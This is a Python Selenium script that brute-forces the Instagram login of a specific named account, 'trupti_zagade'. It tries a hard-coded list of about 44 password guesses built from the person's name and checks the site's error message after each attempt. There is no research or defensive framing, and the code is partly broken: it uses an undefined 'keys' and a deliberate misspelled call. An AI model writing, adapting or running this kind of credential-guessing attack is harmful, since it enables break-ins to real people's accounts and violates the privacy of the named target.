from mutagen.easyid3 import EasyID3
from mutagen.id3 import ID3, ID3NoHeaderError
import sys
from urllib import request
import os
from selenium import webdriver
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.firefox.firefox_profile import FirefoxProfile
import time
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
#import org.openqa.selenium.Keys
from selenium.webdriver.common.keys import Keys
hash = ['trupti',
'trupti',
'trupti26',
'truptitrupti',
'loop968trupti',
'trupti',
'trupti24',
'trupti',
'trupti0623',
'trupti11',
'trupti7566',
'imtrupti',
'trupti5468',
'trupti123',
'trupti18',
'trupti14',
'trupti1234',
'trupti',
'trupti',
'trupti1991',
'trupti110',
'trupti143',
'truptirbrb',
'trupti12',
'renukatrupti',
'truptijhala',
'truptitrupti',
'trupti69',
'trupti89',
'trupti4057',
'trupti12',
'truptithite',
'truptifour',
'Trupti!1997',
'trupti@76',
'trupti1998',
'trupti1986',
'trupti1997',
'Ektatrupti',
'trupti6116',
'trupti123',
'Trupti@27',
'Trupti@09',
'truptisonar'
]
url = 'https://www.instagram.com/accounts/login/'
try:
    psint('sdsd')
    #profile = FirefoxProfile(r"C:\Users\Lawlie8\AppData\Roaming\Mozilla\Firefox\Profiles\wps5zcd0.Saavn")
except:
    profile = webdriver.FirefoxProfile()

user_name = 'div.-MzZI:nth-child(2) > div:nth-child(1) > label:nth-child(1) > input:nth-child(2)'
driver =  webdriver.Firefox(firefox_profile=profile)#,executable_path="geckodriver.exe")
hell = driver.get(url)
WebDriverWait(driver,15).until(EC.presence_of_element_located((By.CSS_SELECTOR,user_name)))
driver.find_element_by_css_selector(user_name).click()
driver.find_element_by_css_selector(user_name).send_keys('trupti_zagade')
password = 'div.-MzZI:nth-child(3) > div:nth-child(1) > label:nth-child(1) > input:nth-child(2)'
driver.find_element_by_css_selector(password).click()
for i in hash:
    driver.find_element_by_css_selector(password).click()
    driver.find_element_by_css_selector(password).send_keys(i)
    driver.find_element_by_css_selector('.L3NKy').click()
    driver.find_element_by_css_selector(password).send_keys(keys.COMMAND + 'a')
    driver.find_element_by_css_selector(password).send_keys(keys.DELETE)
    time.sleep(2)
    x = driver.find_element_by_css_selector('#slfErrorAlert').text
    if x == 'Sorry, your password was incorrect. Please double-check your password.':
        time.sleep(3)
